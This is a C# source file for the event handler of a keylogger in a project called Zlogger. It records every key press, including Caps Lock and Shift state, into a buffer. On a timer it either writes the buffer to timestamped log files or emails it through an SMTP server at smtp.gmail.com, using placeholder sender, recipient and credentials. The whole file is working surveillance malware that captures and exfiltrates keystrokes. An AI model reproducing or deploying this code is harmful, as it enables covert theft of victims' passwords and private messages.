using Rodjenihm.Zlogger.Core;
using System;
using System.IO;
using System.Net.Mail;

namespace Rodjenihm.Zlogger
{
    public static class KeyloggerEventHandler
    {
        public static void HandleKeyDown(Keylogger keylogger, Core.KeyEventArgs e)
        {
            var key = e.VkCode;
            if (key == 20)
            {
                if (!e.IsCapsLocked)
                {
                    keylogger.Buffer.Append($"{key},");
                }
                else
                {
                    keylogger.Buffer.Append($"/{key},");
                }
                return;
            }

            keylogger.Buffer.Append($"{key},");
        }

        public static void HandleKeyUp(Keylogger keylogger, Core.KeyEventArgs e)
        {
            var key = e.VkCode;
            if (key == 160 || key == 161)
            {
                keylogger.Buffer.Append($"/{key},");
            }
        }

        public static void HandleIntervalElapsed_CreateLog(Keylogger keylogger)
        {
            if (keylogger.Buffer.Length > 0)
            {
                var logName = $"log_{DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss")}.txt";
                var logPath = Path.Combine(keylogger.LogDir, logName);
                File.WriteAllText(logPath, keylogger.Buffer.ToString());

                keylogger.Buffer.Clear();
            }
        }

        public static void HandleIntervalElapsed_SendEmail(Keylogger keylogger)
        {
            if (keylogger.Buffer.Length > 0)
            {
                var emailSender = "mail@mail.com"; // Email used to send logs
                var username = "username"; // username for smtp server
                var password = "password"; // password for smtp server
                var emailSendTo = "mail@mail.com"; // Email used to recieve log. It can be the same as emailSender but it doesn't have to be
                var host = "smtp.gmail.com";

                var mail = new MailMessage
                {
                    From = new MailAddress(emailSender)
                };
                mail.To.Add(emailSendTo);
                mail.Subject = $"log_{DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss")}.txt"; ;
                mail.Body = keylogger.Buffer.ToString();

                using (var smtpServer = new SmtpClient(host))
                {
                    smtpServer.Port = 587;
                    smtpServer.Credentials = new System.Net.NetworkCredential(username, password);
                    smtpServer.EnableSsl = true;
                    smtpServer.Send(mail);
                }

                keylogger.Buffer.Clear();
            }
        }
    }
}
